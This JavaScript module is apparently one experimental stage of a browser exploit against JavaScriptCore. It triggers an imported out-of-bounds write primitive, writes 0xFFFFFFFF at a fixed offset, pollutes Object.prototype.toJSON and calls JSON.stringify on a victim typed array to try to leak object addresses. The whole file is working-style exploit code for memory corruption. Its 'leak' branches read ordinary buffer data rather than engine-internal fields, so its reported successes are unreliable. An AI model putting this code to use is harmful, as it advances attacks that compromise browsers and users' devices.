// js/script3/testArrayBufferVictimCrash.mjs (v59_PayloadAsThis_DirectRead)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR = "OriginalHeisenbug_TypedArrayAddrof_v59_PayloadAsThis_DirectRead";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF; // Valor padrão que tem mostrado type confusion

let leak_target_buffer_v59 = null;
let leak_target_dataview_v59 = null;

let victim_typed_array_ref_v59 = null;
let probe_call_count_v59 = 0;
let all_probe_interaction_details_v59 = [];
let first_call_details_object_ref_v59 = null; // Não é o foco principal, mas útil para debug

const PROBE_CALL_LIMIT_V59 = 10;

function toJSON_TA_Probe_PayloadAsThis_DirectRead_v59() {
    probe_call_count_v59++;
    const call_num = probe_call_count_v59;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v59),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v59 && first_call_details_object_ref_v59 !== null),
        this_is_leak_target_AB: (this === leak_target_buffer_v59 && leak_target_buffer_v59 !== null),
        this_is_leak_target_DV: (this === leak_target_dataview_v59 && leak_target_dataview_v59 !== null),
        addrof_read_val: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1_details_obj}. IsLeakAB? ${current_call_details.this_is_leak_target_AB}. IsLeakDV? ${current_call_details.this_is_leak_target_DV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V59) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v59.push(current_call_details);
            return { recursion_stopped_v59: true, call: call_num };
        }

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating C1_details WITH PAYLOADS.`, "info");
            first_call_details_object_ref_v59 = current_call_details; // Armazena ref para C1
            if (leak_target_buffer_v59) current_call_details.payload_AB = leak_target_buffer_v59;
            if (leak_target_dataview_v59) current_call_details.payload_DV = leak_target_dataview_v59;
            all_probe_interaction_details_v59.push(current_call_details);
            return current_call_details; // Retorna C1_details com payloads
        }
        // Caso 2: 'this' é o ArrayBuffer que injetamos no C1_details.payload_AB
        else if (current_call_details.this_is_leak_target_AB && current_call_details.this_type === '[object ArrayBuffer]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET ArrayBuffer! Reading internal pointer...`, "critical");
            let leaked_val = null;
            try {
                let view = new DataView(this);
                const offset = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET; // 0x10
                if (view.byteLength < (offset + 8)) throw new RangeError(`Target AB too small (${view.byteLength}b).`);
                let low = view.getUint32(offset, true);
                let high = view.getUint32(offset + 4, true);
                let ptr = new AdvancedInt64(low, high);
                let temp_buffer = new ArrayBuffer(8); (new Uint32Array(temp_buffer))[0] = low; (new Uint32Array(temp_buffer))[1] = high;
                leaked_val = (new Float64Array(temp_buffer))[0];
                logS3(`[${current_call_details.probe_variant}] Rd TargetAB @${toHex(offset)}: ${ptr.toString(true)} (dbl: ${leaked_val})`, "vuln");
                current_call_details.addrof_read_val = leaked_val;
                all_probe_interaction_details_v59.push(current_call_details);
                return { leaked_address_v59: leaked_val, leaked_obj_type: '[object ArrayBuffer]', from_offset: toHex(offset) };
            } catch (e) {
                logS3(`[${current_call_details.probe_variant}] Err TargetAB read: ${e.message}`, "error");
                current_call_details.error_in_probe = e.message;
                all_probe_interaction_details_v59.push(current_call_details);
                return { addrof_error_v59: e.message, type: '[object ArrayBuffer]' };
            }
        }
        // Caso 3: 'this' é o DataView que injetamos no C1_details.payload_DV
        else if (current_call_details.this_is_leak_target_DV && current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET DataView! Reading internal pointer...`, "critical");
            let leaked_val = null;
            try {
                let view = this; // this é o DataView
                const offset = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x10
                if (view.byteLength < (offset + 8)) throw new RangeError(`Target DV too small (${view.byteLength}b).`);
                let low = view.getUint32(offset, true);
                let high = view.getUint32(offset + 4, true);
                let ptr = new AdvancedInt64(low, high);
                let temp_buffer = new ArrayBuffer(8); (new Uint32Array(temp_buffer))[0] = low; (new Uint32Array(temp_buffer))[1] = high;
                leaked_val = (new Float64Array(temp_buffer))[0];
                logS3(`[${current_call_details.probe_variant}] Rd TargetDV @${toHex(offset)}: ${ptr.toString(true)} (dbl: ${leaked_val})`, "vuln");
                current_call_details.addrof_read_val = leaked_val;
                all_probe_interaction_details_v59.push(current_call_details);
                return { leaked_address_v59: leaked_val, leaked_obj_type: '[object DataView]', from_offset: toHex(offset) };
            } catch (e) {
                logS3(`[${current_call_details.probe_variant}] Err TargetDV read: ${e.message}`, "error");
                current_call_details.error_in_probe = e.message;
                all_probe_interaction_details_v59.push(current_call_details);
                return { addrof_error_v59: e.message, type: '[object DataView]' };
            }
        }
        // Caso 4: 'this' é o C1_details (se for re-visitado)
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is C1_details_obj (re-entry or unexpected). Not modifying further.`, "warn");
            all_probe_interaction_details_v59.push(current_call_details);
            return this; // Evitar modificar para não causar ciclo aqui
        }
        // Outros casos
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected: ${current_call_details.this_type}.`, "warn");
            all_probe_interaction_details_v59.push(current_call_details);
            return { generic_marker_v59: call_num, type: current_call_details.this_type };
        }
    } catch (e_probe) {
        current_call_details.error_in_probe = e_probe.message;
        const FNAME_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR;
        logS3(`[${FNAME_REF}] Probe Call #${call_num}: CRIT ERR: ${e_probe.name} - ${e_probe.message}`, "critical", FNAME_REF);
        all_probe_interaction_details_v59.push(current_call_details);
        return { error_marker_v59: call_num, error_msg: e_probe.message };
    }
}

export async function executeTypedArrayVictimAddrofTest_PayloadAsThis_DirectRead() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (PayloadAsThis_DirectRead) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR} Init...`;

    probe_call_count_v59 = 0;
    all_probe_interaction_details_v59 = [];
    victim_typed_array_ref_v59 = null;
    first_call_details_object_ref_v59 = null;

    leak_target_buffer_v59 = new ArrayBuffer(0x80);
    leak_target_dataview_v59 = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A";
    let stringifyOutput_parsed = null;

    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default (v59)" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default (v59)" };
    // ...

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v59 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        // ...

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_PayloadAsThis_DirectRead_v59, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v59)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v59);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Output: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            logS3("STEP 3: Checking for leaked addresses (v59)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false; // Será true se C1 for modificado ou se um target for 'this'

            const call1Details = all_probe_interaction_details_v59.find(d => d.call_number === 1);
            if (call1Details && (call1Details.payload_AB || call1Details.payload_DV)) {
                 logS3(`  EXECUTE: C1_details was populated with payloads in Call #1.`, "info", FNAME_CURRENT_TEST);
                 heisenbugIndication = true;
            }

            let directLeakOccurred = false;
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.leaked_address_v59 !== undefined) {
                directLeakOccurred = true;
                heisenbugIndication = true; // Se vazou, a heisenbug funcionou
                const leaked_addr = stringifyOutput_parsed.leaked_address_v59;
                const obj_type = stringifyOutput_parsed.leaked_obj_type;
                const offset = stringifyOutput_parsed.from_offset;
                logS3(`  V59_ANALYSIS: 'leaked_address_v59' FOUND in output. Type: ${obj_type}, Offset: ${offset}`, "good");

                if (typeof leaked_addr === 'number' && !isNaN(leaked_addr) && leaked_addr !== 0) {
                    let ptr = new AdvancedInt64(new Uint32Array(new Float64Array([leaked_addr]).buffer)[0], new Uint32Array(new Float64Array([leaked_addr]).buffer)[1]);
                    if (ptr.high() > 0x70000000 || ptr.low() > 0x10000000 || (ptr.high() & 0xFF000000) === 0x80000000) {
                        if (obj_type === '[object ArrayBuffer]') {
                            addrof_A_result.success = true; addrof_A_result.msg = `V59 SUCCESS (Direct Read Target AB): ${ptr.toString(true)} from ${offset}`;
                        } else if (obj_type === '[object DataView]') {
                            addrof_B_result.success = true; addrof_B_result.msg = `V59 SUCCESS (Direct Read Target DV): ${ptr.toString(true)} from ${offset}`;
                        }
                    } else { /* Not pointer pattern */ }
                } else { /* Not useful number */ }
            } else if (stringifyOutput_parsed && stringifyOutput_parsed.parse_error && rawStringifyOutput.includes("circular structure")) {
                 addrof_A_result.msg = "V59 Raw stringify had 'circular structure'.";
                 addrof_B_result.msg = "V59 Raw stringify had 'circular structure'.";
                 heisenbugIndication = true; // Circularity é uma forma de heisenbug
            }

            if (!directLeakOccurred) {
                 if (!addrof_A_result.success) addrof_A_result.msg = "V59 No 'leaked_address_v59' from ArrayBuffer in output.";
                 if (!addrof_B_result.success) addrof_B_result.msg = "V59 No 'leaked_address_v59' from DataView in output.";
            }


            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR}: Addr SUCCESS!`;
            } else if (heisenbugIndication) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR}: No Heisenbug?`;
            }

        } catch (e_str_outer) {
            errorCapturedMain = e_str_outer;
            logS3(`  CRITICAL ERROR during result processing: ${e_str_outer.name} - ${e_str_outer.message}${e_str_outer.stack ? '\n'+e_str_outer.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR}: Processing ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_overall_main) {
        errorCapturedMain = e_overall_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_overall_main.name} - ${e_overall_main.message}${e_overall_main.stack ? '\n'+e_overall_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V59_PATDR} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v59}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v59 = null;
        all_probe_interaction_details_v59 = [];
        probe_call_count_v59 = 0;
        first_call_details_object_ref_v59 = null;
        leak_target_buffer_v59 = null;
        leak_target_dataview_v59 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        stringifyResult: stringifyOutput_parsed,
        rawStringifyForAnalysis: rawStringifyOutput,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v59],
        total_probe_calls: probe_call_count_v59,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
};
